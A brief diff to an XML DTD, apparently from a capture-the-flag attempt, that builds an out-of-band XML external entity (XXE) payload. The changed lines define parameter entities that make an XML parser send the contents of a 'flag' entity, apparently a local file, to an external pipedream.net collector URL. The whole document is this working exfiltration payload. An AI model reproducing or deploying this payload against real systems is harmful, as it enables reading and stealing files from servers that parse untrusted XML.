@@ -1,3 +1,4 @@
-<!ENTITY % hi"<!ENTITY flag SYSTEM 'https://eo8gu8559f8jhog.m.pipedream.net?%getflag;'>">
+<!ENTITY % hi"<!ENTITY % flag SYSTEM 'https://eo8gu8559f8jhog.m.pipedream.net?%getflag;'>">
 
 %hi;
+%flag;
